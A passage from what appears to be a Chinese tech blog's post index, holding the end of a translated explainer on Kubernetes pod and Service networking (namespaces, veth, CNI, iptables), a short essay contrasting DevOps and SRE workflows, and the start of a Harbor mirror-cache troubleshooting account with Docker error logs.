NPROCS PID USER NETNSID NSFS COMMAND 4026531992 net 171 1 root unassigned /run/docker/netns/default /sbin/init noembed norestore 4026532286 net 2 4808 65535 0 /run/docker/netns/56c020051c3b /pause 4026532414 net 5 5489 65535 1 /run/docker/netns/7db647b9b187 /pause lsns 是一个用于列出主机上所有可用命名空间的命令。\n请记住，Linux 中有多种命名空间类型。\nNginx 容器在哪里？\n那些 pause 容器是什么？\n在 Pod 中，pause 容器创建了网络命名空间 先列出节点上的所有命名空间，看看能否找到 Nginx 容器：\n1 2 3 4 5 6 7 8 9 10 lsns NS TYPE NPROCS PID USER COMMAND # truncated output 4026532414 net 5 5489 65535 /pause 4026532513 mnt 1 5599 root sleep 1d 4026532514 uts 1 5599 root sleep 1d 4026532515 pid 1 5599 root sleep 1d 4026532516 mnt 3 5777 root nginx: master process nginx -g daemon off; 4026532517 uts 3 5777 root nginx: master process nginx -g daemon off; 4026532518 pid 3 5777 root nginx: master process nginx -g daemon off; Nginx 容器在挂载 (mnt)、Unix time-sharing (uts) 和 PID (pid) 命名空间中，但不在网络命名空间 (net) 中。\n不幸的是，lsns 只显示每个进程最小的 PID，但你可以根据这个进程 ID 进一步过滤。\n使用以下命令，在所有命名空间中检索 Nginx 容器：\n1 2 3 4 5 6 7 8 9 10 sudo lsns -p 5777 NS TYPE NPROCS PID USER COMMAND 4026531835 cgroup 178 1 root /sbin/init noembed norestore 4026531837 user 178 1 root /sbin/init noembed norestore 4026532411 ipc 5 5489 65535 /pause 4026532414 net 5 5489 65535 /pause 4026532516 mnt 3 5777 root nginx: master process nginx -g daemon off; 4026532517 uts 3 5777 root nginx: master process nginx -g daemon off; 4026532518 pid 3 5777 root nginx: master process nginx -g daemon off; pause 进程再次出现，它劫持了网络命名空间。\n这是怎么回事？\n集群中的每个 Pod 都有一个额外的隐藏容器在后台运行，称为 pause 容器。\n列出在节点上运行的容器并获取 pause 容器：\n1 2 3 4 5 6 docker ps | grep pause fa9666c1d9c6 k8s.gcr.io/pause:3.4.1 \u0026#34;/pause\u0026#34; k8s_POD_kube-dns-599484b884-sv2js… 44218e010aeb k8s.gcr.io/pause:3.4.1 \u0026#34;/pause\u0026#34; k8s_POD_blackbox-exporter-55c457d… 5fb4b5942c66 k8s.gcr.io/pause:3.4.1 \u0026#34;/pause\u0026#34; k8s_POD_kube-dns-599484b884-cq99x… 8007db79dcf2 k8s.gcr.io/pause:3.4.1 \u0026#34;/pause\u0026#34; k8s_POD_konnectivity-agent-84f87c… 可以看到，节点上的每一个 Pod 都会有一个对应的 pause 容器。\n这个 pause 容器负责创建和维持网络命名空间。\n底层容器运行时会完成网络命名空间的创建，通常是由 containerd 或 CRI-O 完成。\n在部署 Pod 和创建容器之前，由运行时创建网络命名空间。\n容器运行时会自动完成这些，不需要手工执行 ip netns 创建命名空间。\n话题回到 pause 容器。\n它包含非常少的代码，并且在部署后立即进入睡眠状态。\n但是，它是必不可少的，并且在 Kubernetes 生态系统中起着至关重要的作用。\n创建 Pod 时，容器运行时会创建一个带有睡眠容器的网络命名空间。 Pod 中的其他容器都会加入由 pause 容器创建的网络名称空间。 此时，CNI 分配 IP 地址并将容器连接到网络。 一个进入睡眠状态的容器有什么用？\n为了理解它的用途，让我们想象一个 Pod 有两个容器，就像前面的例子一样，但没有 pause 容器。\n一旦容器启动，CNI 将会：\n使 busybox 容器加入之前的网络命名空间。 分配 IP 地址。 将容器连接到网络。 如果 Nginx 崩溃了怎么办？\nCNI 将不得不再次执行所有步骤，并且两个容器的网络都将中断。\n由于睡眠容器不太可能有任何错误，因此创建网络命名空间通常是一种更安全、更健壮的选择。\n如果 Pod 中的一个容器崩溃了，剩下的仍然可以回复其他网络请求。\n分配一个 IP 地址给 Pod 前面我提到 Pod 和两个容器将具有同一个 IP 地址。\n那是怎样配置的呢？\n在 Pod 网络命名空间内，创建了一个接口，并分配了一个 IP 地址。\n让我们验证一下。\n首先，找到 Pod 的 IP 地址：\n1 2 3 kubectl get Pod multi-container-Pod -o jsonpath={.status.PodIP} 10.244.4.40 接下来，找到相关的网络命名空间。\n由于网络命名空间是从物理接口创建的，需要先访问集群节点。\n如果你运行的是 minikube，使用 minikube ssh 访问节点。如果在云厂中运行，那么应该有某种方法可以通过 SSH 访问节点。\n进入后，找到最新创建的命名网络命名空间：\n1 2 3 4 5 6 7 8 ls -lt /var/run/netns total 0 -r--r--r-- 1 root root 0 Sep 25 13:34 cni-0f226515-e28b-df13-9f16-dd79456825ac -r--r--r-- 1 root root 0 Sep 24 09:39 cni-4e4dfaac-89a6-2034-6098-dd8b2ee51dcd -r--r--r-- 1 root root 0 Sep 24 09:39 cni-7e94f0cc-9ee8-6a46-178a-55c73ce58f2e -r--r--r-- 1 root root 0 Sep 24 09:39 cni-7619c818-5b66-5d45-91c1-1c516f559291 -r--r--r-- 1 root root 0 Sep 24 09:39 cni-3004ec2c-9ac2-2928-b556-82c7fb37a4d8 在示例中，就是 cni-0f226515-e28b-df13-9f16-dd79456825ac。然后，可以在该命名空间内运行 exec 命令：\n1 2 3 4 5 6 7 8 9 ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac ip a # output truncated 3: eth0@if12: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1450 qdisc noqueue state UP group default link/ether 16:a4:f8:4f:56:77 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.244.4.40/32 brd 10.244.4.40 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::14a4:f8ff:fe4f:5677/64 scope link valid_lft forever preferred_lft forever 这个 IP 就是 Pod 的 IP 地址！通过查找 @if12 中的 12 找到网络接口\n1 2 3 4 ip link | grep -A1 ^12 12: vethweplb3f36a0@if16: mtu 1376 qdisc noqueue master weave state UP mode DEFAULT group default link/ether 72:1c:73:d9:d9:f6 brd ff:ff:ff:ff:ff:ff link-netnsid 1 你还可以验证 Nginx 容器是否监听了来自该命名空间内的 HTTP 流量：\n1 2 3 4 5 6 ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac netstat -lnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 692698/nginx: master tcp6 0 0 :::80 :::* LISTEN 692698/nginx: master 如果你无法通过 SSH 访问集群中的工作节点，你可以使用 kubectl exec 获取到 busybox 容器的 shell 并直接在内部使用 ip 和 netstat 命令。\n刚刚我们介绍了容器之间的通信，再来看看如何建立 Pod 到 Pod 的通信吧。\n查看集群中 Pod 到 Pod 的流量 Pod 到 Pod 的通信有两种可能的情况：\nPod 流量的目的地是同一节点上的 Pod。 Pod 流量的目的地是在不同节点上的 Pod。 整个工作流依赖于虚拟接口对和网桥，下面先来了解一下这部分的内容。\n为了让一个 Pod 与其他 Pod 通信，它必须先访问节点的根命名空间。\n通过虚拟以太网对来实现 Pod 和根命名空间的连接。\n这些虚拟接口设备（veth 中的 v）连接并充当两个命名空间之间的隧道。\n使用此 veth 设备，你将一端连接到 Pod 的命名空间，另一端连接到根命名空间。\nCNI 可以帮你执行这些操作，但你也可以手动执行：\n1 ip link add veth1 netns Pod-namespace type veth peer veth2 netns root 现在 Pod 的命名空间有一个可以访问根命名空间的 隧道。\n节点上，新建的每一个 Pod 都会设置这样的 veth 对。\n一个是，创建接口对；另一个是为以太网设备分配地址并配置默认路由。\n下面看看如何在 Pod 的命名空间中设置 veth1 接口：\n1 2 3 ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac ip addr add 10.244.4.40/24 dev veth1 ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac ip link set veth1 up ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac ip route add default via 10.244.4.40 在节点上，让我们创建另一个 veth2 对：\n1 2 ip addr add 169.254.132.141/16 dev veth2 ip link set veth2 up 可以像前面一样检查现有的 veth 对。\n在 Pod 的命名空间中，检索 eth0 接口的后缀。\n1 2 3 4 ip netns exec cni-0f226515-e28b-df13-9f16-dd79456825ac ip link show type veth 3: eth0@if12: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default link/ether 16:a4:f8:4f:56:77 brd ff:ff:ff:ff:ff:ff link-netnsid 0 在这种情况下，可以使用命令 grep -A1 ^12 查找（或滚动到目标所在处）：\n1 2 3 4 5 ip link show type veth # output truncated 12: cali97e50e215bd@if3: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default link/ether ee:ee:ee:ee:ee:ee brd ff:ff:ff:ff:ff:ff link-netns cni-0f226515-e28b-df13-9f16-dd79456825ac 也可以使用 ip -n cni-0f226515-e28b-df13-9f16-dd79456825ac link show type veth.命令\n注意 3: eth0@if12和12: cali97e50e215bd@if3 接口上的符号。\n从 Pod 命名空间，该 eth0 接口连接到根命名空间的 12 号接口，因此是 @if12.\n在 veth 对的另一端，根命名空间连接到 Pod 命名空间的 3 号接口。\n接下来是连接 veth 对两端的桥接器。\nPod 网络命名空间连接到以太网桥 网桥会汇聚位于根命名空间中的每一个虚拟接口。这个网桥允许虚拟 pair 之间的流量，也允许穿过公共根命名空间的流量。\n补充一下相关原理。\n以太网桥位于 OSI 网络模型 的第 2 层。\n你可以将网桥视为接受来自不同命名空间和接口的连接的虚拟交换机。\n以太网桥可以连接节点上的多个可用网络。\n因此，可以使用网桥连接两个接口，即 Pod 命名空间的 veth 连接到同一节点上另一个 Pod 的 veth。\n接下来，继续看网桥和 veth 对的用途。\n跟踪在同一节点上 Pod 到 Pod 的流量 假设同一个节点上有两个 Pod，Pod-A 向 Pod-B 发送消息。\n由于访问目标不在同一个命名空间，Pod-A 将数据包发送到其默认接口 eth0。 这个接口与 veth 对的一端绑定，作为隧道。这样，数据包会被转发到节点上的根命名空间。 以太网网桥作为一个虚拟交换机，需要目标 Pod-B 的 MAC 地址才能工作。 ARP 协议会解决这个问题。当帧到达网桥时，会向所有连接的设备发送 ARP 广播。网桥广播询问持有 Pod-B 的 IP 地址 此时会收到一个带有 Pod-B IP 的 MAC 地址应答，这条消息会被存储在桥接 ARP 缓存(查找表)中。 IP 地址和 MAC 地址的映射关系存储之后，网桥就在表中查找，并将数据包转发到正确的端点。数据包到达根命名空间内 Pod-B 的 veth 之后，很快又到达 Pod-B 命名空间内的 eth0 接口。 至此，Pod-A 和 Pod-B 之间的通信就成功了。\n跟踪不同节点上的 Pod 到 Pod 通信 对于跨节点 Pod 之间的通信，会经过额外的通信跳跃。\n前几个步骤保持不变，直到数据包到达根命名空间并需要发送到 Pod-B。 当目的 IP 不在本地网络中时，报文被转发到节点的默认网关。节点的出口网关或默认网关，通常位于节点与网络相连的物理接口 eth0 上。 此时 不会发生 ARP 解析，因为源 IP 和目标 IP 不在同一个网段中。\n网段的检查是使用按位运算完成的。\n当目的 IP 不在当前网络段时，数据包被转发到节点的默认网关。\n按位运算的工作原理 在确定数据包的转发位置时，源节点必须执行位运算\n这也称为与操作。\n复习一下，按位与运算的规则：\n0 AND 0 = 0 0 AND 1 = 0 1 AND 0 = 0 1 AND 1 = 1 除了 1 与 1 以外的都是 false。\n如果源节点的 IP 为 192.168.1.1，子网掩码为 /24，目标 IP 为 172.16.1.1/16，则按位与运算将得知它们位于不同的网段上。\n这意味着目标 IP 与数据包的源不在同一个网络上，数据包将通过默认网关转发。\n数学时间。\n我们必须从二进制的 32 位地址开始进行 AND 操作。\n先找出源 IP 网络和目标 IP 网段。\nType Binary Converted Src. IP Address 11000000.10101000.00000001.00000001 192.168.1.1 Src. Subnet Mask 11111111.11111111.11111111.00000000 255.255.255.0(/24) Src. Network 11000000.10101000.00000001.00000000 192.168.1.0 Dst. IP Address 10101100.00010000.00000001.00000001 172.16.1.1 Dst. Subnet Mask 11111111.11111111.00000000.00000000 255.255.0.0(/16) Dst. Network 10101100.00010000.00000000.00000000 172.16.0.0 按位运算之后，需要将目标 IP 与数据包源节点的子网进行比较。\nType Binary Converted Dst. IP Address 10101100.00010000.00000001.00000001 172.16.1.1 Src. Subnet Mask 11111111.11111111.11111111.00000000 255.255.255.0(/24) Network Result 10101100.00010000.00000001.00000000 172.16.1.0 运算的结果是 172.16.1.0，不等于 192.168.1.0（源节点的网络）。说明源 IP 地址和目标 IP 地址不在同一个网络上。\n如果目标 IP 是 192.168.1.2，即与发送 IP 在同一子网中，则 AND 操作将得到节点的本地网络。\nType Binary Converted Dst. IP Address 11000000.10101000.00000001.00000010 192.168.1.2 Src. Subnet Mask 11111111.11111111.11111111.00000000 255.255.255.0(/24) Network 11000000.10101000.00000001.00000000 192.168.1.0 进行逐位比较后，ARP 通过查找表查找默认网关的 MAC 地址。\n如果有条目，将立即转发数据包。\n否则，先进行广播以找到网关的 MAC 地址。\n现在，数据包路由到另一个节点的默认接口，我们称为 Node-B。 以相反的顺序。现在，数据包位于 Node-B 的根命名空间，并到达网桥，这里会进行 ARP 解析。 路由系统将返回与 Pod-B 相连的接口的 MAC 地址。 网桥通过 Pod-B 的 veth 设备转发帧，并到达 Pod-B 的命名空间。 至此，你应该已经熟悉了 Pod 之间的流量是如何流转的。下面，让我们花点时间来看看 CNI 如何管理上述内容。\n容器网络接口 - CNI 容器网络接口（CNI）主要关注的是当前节点中的网络。\n可以将 CNI 看作为解决 Kubernetes 网络需求，而遵循的一组规则。\n有这些 CNI 实现可供使用：\nCalico Cillium Flannel Weave Net 其他网络插件 他们都遵循相同的 CNI 标准。\n如果没有 CNI，你需要人工完成如下操作：\n创建接口。 创建 veth 对。 设置网络命名空间。 设置静态路由。 配置以太网桥。 分配 IP 地址。 创建 NAT 规则。 还有其他大量事情。 这还不包括，在删除或重启 Pod 时，需要进行类似的全部操作。\nCNI 必须支持四种不同的操作：\nADD - 向网络添加一个容器。 DEL - 从网络中删除一个容器。 CHECK - 如果容器的网络出现问题，则返回错误。 VERSION - 显示插件的版本。 我们一起看下，CNI 是如何工作的。\n当 Pod 被分配到特定节点时，Kubelet 自身不会初始化网络。\n相反，Kubelet 将这个任务交给 CNI。\n但是，Kubelet 以 JSON 格式指定配置并发送至 CNI 插件。\n你可以进入节点上的 /etc/cni/net.d 文件夹，使用以下命令查看当前的 CNI 配置文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 cat 10-calico.conflist { \u0026#34;name\u0026#34;: \u0026#34;k8s-Pod-network\u0026#34;, \u0026#34;cniVersion\u0026#34;: \u0026#34;0.3.1\u0026#34;, \u0026#34;plugins\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;calico\u0026#34;, \u0026#34;datastore_type\u0026#34;: \u0026#34;kubernetes\u0026#34;, \u0026#34;mtu\u0026#34;: 0, \u0026#34;nodename_file_optional\u0026#34;: false, \u0026#34;log_level\u0026#34;: \u0026#34;Info\u0026#34;, \u0026#34;log_file_path\u0026#34;: \u0026#34;/var/log/calico/cni/cni.log\u0026#34;, \u0026#34;ipam\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;calico-ipam\u0026#34;, \u0026#34;assign_ipv4\u0026#34; : \u0026#34;true\u0026#34;, \u0026#34;assign_ipv6\u0026#34; : \u0026#34;false\u0026#34;}, \u0026#34;container_settings\u0026#34;: { \u0026#34;allow_ip_forwarding\u0026#34;: false }, \u0026#34;policy\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;k8s\u0026#34; }, \u0026#34;kubernetes\u0026#34;: { \u0026#34;k8s_api_root\u0026#34;:\u0026#34;https://10.96.0.1:443\u0026#34;, \u0026#34;kubeconfig\u0026#34;: \u0026#34;/etc/cni/net.d/calico-kubeconfig\u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;bandwidth\u0026#34;, \u0026#34;capabilities\u0026#34;: {\u0026#34;bandwidth\u0026#34;: true} }, {\u0026#34;type\u0026#34;: \u0026#34;portmap\u0026#34;, \u0026#34;snat\u0026#34;: true, \u0026#34;capabilities\u0026#34;: {\u0026#34;portMappings\u0026#34;: true}} ] } 每个 CNI 插件都会使用不同类型的网络配置。\n例如，Calico 使用基于 BGP 的三层网络连接 Pod\nCilium 从三层到七层使用的是基于 eBPF 的 overlay 网络\n与 Calico 一样，Cilium 也支持通过配置网络策略来限制流量。\n那么你应该使用哪一个呢？主要有两类 CNI。\n在第一类中，使用基本网络设置（也称为平面网络），从集群的 IP 池为 Pod 分配 IP 地址的 CNI。\n这种方式可能很快耗尽 IP 地址，而成为负担。\n相反，另一类是使用 overlay 网络。\n简单来说，overlay 网络是主（底层）网络之上的重建网络。\noverlay 网络通过封装来自底层网络的数据包工作，这些数据包被发送到另一个节点上的 Pod。\noverlay 网络的一种流行技术是 VXLAN，它可以在 L3 网络上建立 L2 域的隧道。\n那么哪个更好呢？\n没有单一的答案，这取决于你的需求。\n你是否正在构建具有数万个节点的大型集群？\n也许 overlay 网络更好。\n你是否在意更简单的配置和审查网络流量，而不会愿意在复杂网络中丢失这种能力？\n扁平网络更适合你。\n现在我们讨论完了 CNI，接着让我们来看看 Pod 到服务的通信是如何连接的。\n检查 Pod 到 Service 的流量 由于 Pod 在 Kubernetes 中是动态的，分配给 Pod 的 IP 地址不是静态的。\nPod 的 IP 是短暂的，每次创建或删除 Pod 时都会发生变化。\nKubernetes 中的 Service 解决了这个问题，为连接一组 Pod 提供了可靠的机制。\n默认情况下，在 Kubernetes 中创建 Service 时，被分配一个虚拟 IP。\n在 Service 中，可以使用选择器将 Service 与目标 Pod 相关联。\n当删除或添加一个 Pod 时会发生什么呢？\nService 的虚拟 IP 保持静态不变。\n但流量可以再无需干预的情况下，到达新创建的 Pod。\n换句话说，Kubernetes 中的 Service 类似于负载均衡器。\n但它们是如何工作的？\n使用 Netfilter 和 Iptables 拦截和重写流量 Kubernetes 中的 Service 是基于 Linux 内核中的两个组件构建的：\n网络过滤器 iptables Netfilter 是一个可以配置数据包过滤、创建 NAT 、端口转发规则以及管理网络中流量的框架\n此外，它可以屏蔽和禁止未经同意的访问。\n另一方面，iptables 是一个用户态程序，可以用来配置 Linux 内核防火墙的 IP 数据包过滤规则。\niptables 是作为不同的 Netfilter 模块实现的。\n可以使用 iptables CLI 即时修改过滤规则，并将它们插入 netfilters 挂载点。\n过滤器配置在不同的表中，其中包含用于处理网络流量数据包的链。\n不同的协议使用不同的内核模块和程序。\n当提到 iptables 时，通常指的是 IPv4。对于 IPv6 ，终端工具是 ip6tables。\niptables 有五种链，每一种链都直接映射到 Netfilter 的钩子上。\n从 iptables 的角度来看，它们是：\nPRE_ROUTING INPUT FORWARD OUTPUT POST_ROUTING 它们对应地映射到 Netfilter 钩子：\nNF_IP_PRE_ROUTING NF_IP_LOCAL_IN NF_IP_FORWARD NF_IP_LOCAL_OUT NF_IP_POST_ROUTING 当一个数据包到达时，根据它所处的阶段，将 “触发” 一个 Netfilter 钩子。这个钩子会执行特定的 iptables 过滤规则。\n哎呀！看起来很复杂！\n不过没什么好担心的。\n这就是我们使用 Kubernetes 的原因，以上所有内容都是通过使用 Service 抽象出来的，并且一个简单的 YAML 定义可以自动设置这些规则。\n如果你有兴趣查看 iptables 规则，可以连接到节点并运行：\n1 iptables-save 你还可以使用这个工具来可视化节点上的 iptables 链。\n这是来自 GKE 节点上的可视化 iptables 链的示例图：\n注意，这里可能配置了几百条规则，想想一下自己动手怎么配置！\n至此，我们已经了解了，相同节点上的 Pod 和不同节点上 Pod 之间是如何通信的。\n在 Pod 与 Service 的通信中，链路的前半部分是一样的。\n当请求从 Pod-A 走向 Pod-B 时，由于 Pod-B 在 Service 的 \u0026ldquo;后面\u0026rdquo;，在传输的过程中，会有一些不一样。\n原始的请求，在 Pod-A 命名空间的 eth0 接口发出。\n接着，请求通过 veth到达根名称空间的网桥。\n一旦到达网桥，数据包就会立即通过默认网关转发。\n与 Pod-to-Pod 部分一样，主机进行按位比较。由于服务的虚拟 IP 不是节点 CIDR 的一部分，因此数据包将立即通过默认网关转发。\n如果默认网关的 MAC 地址尚未出现在查找表中，则会进行 ARP 解析找出默认网关的 MAC 地址。\n现在神奇的事情发生了。\n在数据包通过节点的路由之前，Netfilter 的 NF_IP_PRE_ROUTING 挂钩被触发，并执行 iptables 规则。这个规则会修改 Pod-A 数据包的目标 IP 地址 DNAT。\n前面服务的虚拟 IP 地址被重写为 Pod-B 的 IP 地址。\n接下来，数据包路由过程与 Pod 到 Pod 的通信一样。\n数据包重写后，通信是 Pod 到 Pod。\n然而，在所有这些通信中，使用了一个第三方的功能。\n此功能称为 conntrack 或链路跟踪。\n当 Pod-B 发回响应时，conntrack 会将数据包与链路相关联，并跟踪其来源。\nNAT 严重依赖于 conntrack。\n如果没有链路跟踪，将不知道将包含响应的数据包发回何处。\n使用 conntrack 时，数据包的返回路径很容易设置为相同的源或目标 NAT 更改。\n通信的另一部分与现在的链路相反。\nPod-B 接收并处理了请求，现在将数据发送回 Pod-A。\n现在会发生什么呢？\n检查来自服务的响应 Pod-B 发送响应，将其 IP 地址设置为源地址，并将 Pod-A 的 IP 地址设置为目标地址。\n当数据包到达 Pod-A 所在节点的接口时，会发生另一个 NAT。\n这时，conntrack 开始工作，修改源 IP 地址，iptables 规则执行 SNAT，并将 Pod-B 的源 IP 地址修改为原始服务的虚拟 IP。\n对于 Pod-A 来说，响应是来自于 Service 而不是 Pod-B。\n其余的都是一样的。一旦 SNAT 完成，数据包就会到达根命名空间中的网桥，并通过 veth 对转发到 Pod-A。\n总结一下 让我们一起回顾下本文相关要点\n容器如何在本地或 Pod 内通信。 在相同节点和不同节点上的 Pod 如何通信。 Pod-to-Service - Pod 如何将流量发送到 Kubernetes 中服务后面的 Pod 时。 什么是命名空间、veth、iptables、chains、conntrack、Netfilter、CNI、overlay 网络，以及 Kubernetes 网络工具箱中所需的一切。 ","description":"","id":138,"section":"post","tags":["翻译","Kubernetes","网络"],"title":"Kubernetes 网络流量转发详解","uri":"https://www.chenshaowen.com/blog/kubernetes-network-packets.html"},{"content":"1，脱离职责的流程是没有意义的 软件架构与组织架构相匹配，不仅仅体现在功能边界，更体现在职责划分。\n清晰的职责边界，才能构筑良好的团队协作与发展。每个团队、每个人都应该明白自己的目标，什么事情应该承担，什么事情应该回避，将时间和精力投入到对主要目标有增益的事情，不能陷于琐屑。如此，团队中的成员才不会那么累，有可能沉淀一些领域知识，进行有深度的思考。\n清晰的职责边界很难。这并不是一个管理上的问题，而是一个执行的问题。一个流程可能会涉及到很多的人，但这些人的业务水平在各自的领域并不一定在同一个档次。通常，我们在大公司能看到清晰的边界，很重要的一点是他们招聘了一群牛人。而在中小公司，牛人的比例很少，一旦某个环节出现了短板，就需要其他人补充。这样就破坏了职责的边界，进入了无流程的状态。\n职责边界的破坏会让团队总是处于救火的状态。每次出了问题，团队中的人不去关注自己的职责范围，而依赖于少数的消防员灭火。因为这些消防员精通整个流程，处理问题又快又好，越用越顺手。但这并不是一个可持续的方式，随着业务的增长，问题会越来越多，但消防员也能同比例增长吗？是否在不同的业务阶段，我们依然需要不同比例的消防员，这是一个值得继续思考的问题。\n下面主要讨论的是 DevOps 和 SRE 的两种协作流程。\n2，DevOps 向右 如下图，从工作流看，DevOps 是向右的。\n在流水线上，开发人员借助于平台，依次完成需求管理、编码、编译、部署等环节。这里简化了整个流程，也没有形成经典环路。\nDevOps 强调的是端到端的价值交付，一端指的是需求，另一端指的是用户。从需求到交付给用户使用，才算一次完整的 DevOps 迭代。\nDevOps 并没有强调对交付价值的度量和管理，这与 SRE 有着显著差异。\n虽然交付是由研发自助完成，但是运维和运维开发人员会对其进行支撑。运维开发人员主要是提供自动化的能力，降低交付的门槛，提高交付的效率。而运维人员主要是以专家的形式，提供领域上的指导，设计整个流程。\n3，SRE 向左 如下图，从工作流看，SRE 是向左的。\n如果说 DevOps 的工作方式类似 KPI，那么 SRE 的工作方式更像 OKR。DevOps 从需求出发，制定良好规划，稳步推进，一个流程一个流程转交，最终上线交付给用户。但 SRE 不一样，SRE 是先有目标，再来考虑应该做出哪些努力，从哪些方面入手以达成目标。\n也有一种说法，SRE 是 DevOps 的一种最佳实践。我认为这是一种概念上的泛化而已，因为他们讨论的对象重合度太高。快速发展的概念，总是会有各种解读和扩展。但这里，我们可以明显看到 DevOps 和 SRE 在工作流上的一个差异。\n我们一起来看看 SRE 工作流。首先是由运维人员或领域人士制定 SLI 核心指标。制定指标的目的是为了可以度量。只有业务指标可以度量，业务指标才能够得到管理。接着，根据管理者的 OKR 制定相关的 SLO 指标目标，应该达到多少。然后，研发人员配合 SLO 目标进行业务的改进。\nSRE 工作流之后，需要再走一次 DevOps 的流水线，才能发布上线。\n4，总结 本文主要讨论了职责划分对流程的重要性和 DevOps、SRE 两种工作流。这里并没有对立 DevOps 、SRE 两种工作流。实际上，SRE 工作流也需要 DevOps 工作流的支撑，他们并不是孤立的存在。\n另一方面，适用场景、业务阶段也很重要。直接指定一个新业务的 SLO 并不合适，因为 SLI 并不好制定和度量，此时应该采用 DevOps 工作流，稳步迭代上线。\n","description":"","id":139,"section":"post","tags":["博文","SRE","DevOps","思考"],"title":"SRE 向左，DevOps 向右","uri":"https://www.chenshaowen.com/blog/sre-to-left-devops-to-right.html"},{"content":"1，接上一回，共享存储优化海外镜像的拉取 在基于 Harbor 和 Registry 的镜像管理分发方案的基础上，最近又做了一个优化。\n之前的方案是，在每个区域，使用一台低配大磁盘的机器，部署一个 Mirror Cache 缓存镜像。这样带来一个问题，就是每个区域都需要拉取一个镜像，如果有 N 个区域，那么发布一个应用，得拉取 N 次，同时发布时专线带宽占用得乘以 N 。\n这里被忽略的是，海外云厂的网速一般都非常快。我们可以将海外的区域，根据连通质量进行划片，每个片区部署 Mirror Cache。\n另外一个运维问题是部署 Mirror Cache 的主机，怎么进行磁盘扩容和镜像清理。虽然 Registry 可以设置缓存周期，但社区反馈设置并不生效；而磁盘扩容上限是 1T，之后就需要迁移到数据盘。因此这里采用了另一种方案，多个 Mirror Cache 之间共享后端存储。如下图所示:\n使用同一个 OBS 后端存储的优势在于:\n发布多区应用，只需要拉取一次，而不用每个区拉取一次 使用 OBS、S3 等对象存储的扩展性、稳定性比本地磁盘好 即使没有 CDN 加速，大厂的对象存储服务在全球的速度都不差 对象存储能设置生命周期管理，可以用于自动清理镜像数据 由于镜像的全部数据都缓存在 OBS 对象存储，因此 Mirrir Cache 实际上是一个无状态的服务。更进一步，我们可以将其合并为一个，放置在连通各区质量好的区域。\n下面进入本文主题，一次大镜像拉取失败的经历。\n2，拉取大镜像时失败 镜像的大小在 10G 左右。拉取链路如下:\nDocker Client -\u0026gt; Docker Daemon -\u0026gt; Mirror Cache -\u0026gt; LB -\u0026gt; Harbor\n各个组件，具体报错如下:\n拉取镜像时 Docker Client 不停重试大的单层镜像 1 2a57ddc33014: Downloading [=======================\u0026gt; ] 646.6MB/1.378GB 在进度条达到接近 70%-80% 时，这一层镜像重新开始拉取:\n1 2a57ddc33014: Retrying in 2 seconds 拉取主机 Docker Daemon 错误日志 1 2 3 Sep 08 01:12:08 x.x.x.x dockerd[8434]: time=\u0026#34;2022-09-08T01:12:08.681917626Z\u0026#34; level=info msg=\u0026#34;Download failed, retrying (2/5): expected HTTP 206 from byte range request\u0026#34; Sep 08 01:19:17 x.x.x.x dockerd[8434]: time=\u0026#34;2022-09-08T01:19:17.196665587Z\u0026#34; level=info msg=\u0026#34;Download failed, retrying (3/5): unexpected EOF\u0026#34; Sep 08 01:19:20 x.x.x.x dockerd[8434]: time=\u0026#34;2022-09-08T01:19:20.197654060Z\u0026#34; level=error msg=\u0026#34;Not continuing with pull after error: context canceled\u0026#34; 镜像缓存服务 Mirror Cache 的错误日志 1 2 3 linux arch/amd64 UpstreamClient(Docker-Client/20.10.13 \\\\(linux\\\\))\u0026#34; time=\u0026#34;2022-09-08T02:30:50.580118978Z\u0026#34; level=error msg=\u0026#34;Error committing to storage: stream error: stream ID 17; INTERNAL_ERROR; received from peer\u0026#34; auth.user.name=x go.version=go1.16.15 http.request.host=harbor.chenshaowen.com http.request.id=d51a853a-447a-44bf-9e0e-f015fb4c9bd8 http.request.method=GET http.request.remoteaddr=x.x.x.x http.request.uri=\u0026#34;/v2/x/x/blobs/sha256:2c618d17e28be23c5c38b084bfb3f288371bbed89181e57f7cf43f535261e354\u0026#34; http.request.useragent=\u0026#34;docker/18.09.7 go/go1.10.8 git-commit/2d0083d kernel/3.10.0-1160.53.1.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/20.10.13 \\(linux\\))\u0026#34; vars.digest=\u0026#34;sha256:2c618d17e28be23c5c38b084bfb3f288371bbed89181e57f7cf43f535261e354\u0026#34; vars.name=\u0026#34;x/x\u0026#34; time=\u0026#34;2022-09-08T02:30:50.580404499Z\u0026#34; level=error msg=\u0026#34;response completed with error\u0026#34; auth.user.name=x err.code=unknown err.detail=\u0026#34;stream error: stream ID 15; INTERNAL_ERROR; received from peer\u0026#34; err.message=\u0026#34;unknown error\u0026#34; go.version=go1.16.15 http.request.host=x http.request.id=d51a853a-447a-44bf-9e0e-f015fb4c9bd8 http.request.method=GET http.request.remoteaddr=x.x.x.x http.request.uri=\u0026#34;/v2/x/x/blobs/sha256:2c618d17e28be23c5c38b084bfb3f288371bbed89181e57f7cf43f535261e354\u0026#34; http.request.useragent=\u0026#34;docker/18.09.7 go/go1.10.8 git-commit/2d0083d kernel/3.10.0-1160.53.1.el7.x86_64 os/linux arch/amd64 UpstreamClient(Docker-Client/20.10.13 \\(linux\\))\u0026#34; http.response.contenttype=\u0026#34;application/json; charset=utf-8\u0026#34; http.response.duration=3m30.111855949s http.response.status=500 http.response.written=1091061683 